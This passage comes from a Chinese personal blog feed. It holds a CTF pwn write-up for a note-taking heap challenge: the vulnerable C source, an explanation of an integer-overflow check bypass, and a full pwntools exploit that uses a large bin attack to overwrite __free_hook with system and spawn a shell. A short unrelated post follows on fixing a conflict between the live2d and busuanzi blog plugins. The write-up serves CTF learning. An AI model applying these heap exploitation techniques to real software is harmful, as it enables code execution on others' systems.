error</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'\n'</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      buf[i] = c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is in use"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input data length */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">size</span> &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Size must be larger than 0"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize note */</span></span><br><span class="line">  <span class="keyword">if</span> (!(content = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">size</span>)))</span><br><span class="line">    CHECK_FAIL(<span class="string">"Could not allocate the memory"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(content, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">  note-&gt;content = content;</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> offset, count, epos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input offset */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;offset) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input count */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Count: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;count) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line">  <span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Edit content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(&amp;note-&gt;content[offset], count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print note */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(<span class="number">1</span>, note-&gt;content, note-&gt;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Delete note */</span></span><br><span class="line">  <span class="built_in">free</span>(note-&gt;content);</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">  note-&gt;content = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. CreateNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. EditNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. PrintNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. DeleteNote"</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> choice, index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input choice */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choice: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;choice) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (choice &lt; <span class="number">1</span> || choice &gt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input index */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;index) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Security check */</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= MAX_NOTE) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: CreateNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: EditNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: PrintNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: DeleteNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目主要漏洞在它的edit功能的安全检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Security check */</span></span><br><span class="line"><span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line"><span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line"><span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br></pre></td></tr></table></figure><p>题目在<code>offset + count</code>进行检查时，忘了在int64 中<code>0x8000000==0</code>的情况。</p><p>导致我们可以任意写，然后通过 <code>PrintNote</code>泄露出基地址。</p><p>但是，由于calloc函数，导致我们不能用tache bin 来attack。</p><p>但是由于题目没有限制chunk大小，导致我们可以利用Large bin Attack 写入<em>`</em>free_hook+0x20<code>处再创造chunk覆盖</code>__free_hook`为system。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/07 21:47:24</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./chall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.bsidesahmedabad.in'</span>,<span class="number">9003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,offset,count,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Offset:'</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    p.recvuntil(<span class="string">'Count:'</span>)</span><br><span class="line">    p.sendline(str(count))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x548</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2147483647</span><span class="number">-1</span>,<span class="string">'8'</span>*<span class="number">0x46</span>+p64(<span class="number">0x501</span>)+<span class="string">'8'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x2d8</span>,<span class="string">'x'</span>*<span class="number">0x270</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x281</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">6</span>)</span><br><span class="line">free_hook=x.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">'1'</span>*<span class="number">8</span>) <span class="comment">#p1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'2'</span>*<span class="number">8</span>)<span class="comment">#g1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">'3'</span>*<span class="number">8</span>)<span class="comment">#p2</span></span><br><span class="line"><span class="comment"># put a chunk to unsorted bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># put a chunk to large bin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x438</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment"># put a chunk to unsorted bi</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#modify bk-&gt;next of chunk p1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x38</span>, (<span class="number">0x7fffffff</span><span class="number">-0x38</span>+<span class="number">1</span>), p64(free_hook<span class="number">-0x4b</span><span class="number">-2</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">'3'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, (<span class="number">0x7fffffff</span><span class="number">-8</span>+<span class="number">1</span>),<span class="number">0x40</span>*<span class="string">'1'</span>+p64(<span class="number">0x51</span>)+p64(free_hook<span class="number">-0x30</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>,<span class="string">'3'</span>*<span class="number">0x20</span>+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.anquanke.com/post/id/244018" target="_blank" rel="noopener">https://www.anquanke.com/post/id/244018</a></p><p><a href="https://www.anquanke.com/post/id/242640#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242640#h2-2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉&lt;del&gt;~&lt;/del&gt;(◞‸◟ )tcl…）</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</title>
    <link href="lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/"/>
    <id>lexsd6.github.io/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/</id>
    <published>2021-11-03T12:58:38.417Z</published>
    <updated>2022-02-22T12:22:17.129Z</updated>
    
    <content type="html"><![CDATA[<p>今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。<a id="more"></a></p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>未安装live2d且不蒜子配置正常，执行<code>npm install --save hexo-helper-live2d</code>后，不蒜子计数冲突不显示计数。<br>已安装live2d但<code>live2d.enable</code>由<code>true</code>改为<code>false</code>后，不蒜子显示计数。</p><p>同时正常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>异常时，代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_pv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"far fa-eye"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问量:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>次</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_container_site_uv"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">    |<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-users"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span>总访问人数:<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"white-color"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="symbol">&amp;nbsp;</span>人</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.打开footer.ejs文件，找到与不蒜子相关的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.visit_counter.on) &#123; %&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;visit&quot;&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_site_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;site-visit&quot; title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.site&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-user&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot; style&#x3D;&#39;display:inline&#39;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;page-visit&quot;  